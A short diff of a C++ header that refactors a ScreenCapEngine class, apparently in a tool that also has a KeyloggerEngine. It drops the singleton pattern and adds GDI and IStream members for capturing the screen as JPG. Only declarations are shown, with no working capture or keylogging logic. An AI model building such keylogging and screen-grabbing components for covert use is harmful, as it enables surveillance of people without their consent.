@@ -39,10 +39,6 @@ class KeyloggerEngine {
 
 class ScreenCapEngine {
     public:
-    static ScreenCapEngine& getInstance() {
-        static ScreenCapEngine instance;
-        return instance;
-    }
 
     // Return codes:
     //   0     = Success
@@ -60,13 +56,19 @@ class ScreenCapEngine {
     //   -5/-6 = CreateStreamOnHGlobal() failed (E_INVALIDARG/E_OUTOFMEMORY)
     //   -7/-8 = Second CreateStreamOnHGlobal() failed
     int MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize);
+    ScreenCapEngine() = default;
+    ~ScreenCapEngine() {}
     
     private:
-    ScreenCapEngine() {}
-    ~ScreenCapEngine() {}
+    int freelim = 0;
+
+    HDC hDC, hMemDC;
+    HBITMAP hBitmap;
+    char *memblock;
+    STATSTG *jpg_stat;
+    IStream *rawbitmap_stream, *jpg_stream;
+
     ScreenCapEngine(const ScreenCapEngine&) = delete;
     ScreenCapEngine& operator=(const ScreenCapEngine&) = delete;
-
-    class leblanc;
-    std::vector<long long> linehash;
+    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 };
